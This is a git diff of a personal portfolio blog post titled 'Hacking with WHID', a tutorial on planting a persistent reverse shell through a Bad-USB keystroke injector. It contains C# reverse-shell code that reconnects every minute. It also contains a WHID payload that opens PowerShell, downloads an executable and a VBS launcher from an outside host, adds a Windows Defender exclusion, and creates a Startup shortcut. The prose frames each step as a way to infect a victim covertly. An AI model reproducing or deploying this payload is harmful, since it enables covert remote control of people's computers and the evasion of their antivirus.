@@ -1,4 +1,18 @@
+---
+permalink: /portfolio/whid/
+author: Rick Theeuwes
 
+defaults:
+  # _pages
+  - scope:
+      path: ""
+      type: pages
+    values:
+      layout: single
+      author_profile: true
+toc: true
+title: Hacking with WHID
+---
 
 ## Presistent reverse shell
 
@@ -6,10 +20,10 @@ A reverse shell is great, but what if he stayed, no matter what? Using a Bad-USB
 
 ### The shell
 
-First, we need our shell. This will be an executable written in `dotnet core 3.1`:
+First, we need our shell. This will be an executable written in `dotnet core 3.1` ([source](https://www.puckiestyle.nl/c-simple-reverse-shell/)):
 
 ```C#
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Net.Sockets;
@@ -31,7 +45,7 @@ namespace Shell1
                     connect();
                 }
                 catch { }
-                
+
                 Thread.Sleep(60000); //wait a minute before reconnecting
             }
         }
@@ -89,19 +103,19 @@ namespace Shell1
 }
 ```
 
-This code creates a reverse shell to the gives IP address, which is restarted every minute after closing. But this program has to be started by a user after every reboot. And the users won't just trust every program, so we need something to get the executable on the victim's system without their knowledge. Here the Bad-USB comes into play. For this example I used my WHID-Cactus, but it can be rewritten and used on any Bad-USB.
+This code creates a reverse shell to the gives IP address, which is restarted every minute after closing. But this program has to be started by a user after every reboot. And the users won't just trust every program, so we need something to get the executable on the victim's system without their knowledge. Here the Bad-USB comes into play. For this example I used my WHID-Cactus, but it can be rewritten and used on any Bad-USB. I only changed the contents of the main method, so that the shell would reconnect after a minute.
 
 ```whid
 Press:131+114
 Print:powershell
 Press:128+129+176
 Press:216+176
-PrintLine:(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/shell.exe", "$env:APPDATA\..\Local\Microsoft\Windows\0\wincore.exe")
+PrintLine:(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/shell.exe", "$env:APPDATA\..\Local\Microsoft\Windows\0\wincore.exe") //TODO MY ip
 PrintLine:(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/invis.vbs", "$env:APPDATA\..\Local\Microsoft\Windows\0\start.vbs")
 PrintLine:Add-MpPreference -ExclusionProcess "wincore.exe"
 PrintLine:$s = (New-Object -comObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wincore.lnk"); $s.TargetPath="C:\Windows\System32\wscript.exe";$s.Arguments="`"$env:APPDATA\..\Local\Microsoft\Windows\0\start.vbs`" `"C:\Users\admin\AppData\Local\Microsoft\Windows\0\wincore.exe`""; $s.Save();
 exit
-```
+```//TODO sources
 
 This little piece of code will make the perfect shell. Let's look at it line by line.
 
@@ -154,6 +168,7 @@ And lastly, we create a shortcut in `C:\users\{user}\AppDate\Roaming\Microsoft\W
 ```powershell
 PrinteLine:C:\Windows\System32\wscript.exe "C:\Users\admin\AppData\Roaming\..\Local\Microsoft\Windows\0\start.vbs" "C:\Users\admin\AppData\Local\Microsoft\Windows\0\wincore.exe"
 ```
+
 This is simply the content of the shortcut.
 
-We end the script with `exit`, so the user does not see that something is up. Currenty, the script consists of multiple lines executed in powershell, but if it is rewritten to one powershell command that runs in the background, this injection can take only a few seconds to be ready. The execution then happens on the background, even when the usb is pulled out.
+We end the script with `exit`, so the user does not see that something is up. Currently, the script consists of multiple lines executed in powershell, but if it is rewritten to one powershell command that runs in the background, this injection can take only a few seconds to be ready. The execution then happens on the background, even when the usb is pulled out.
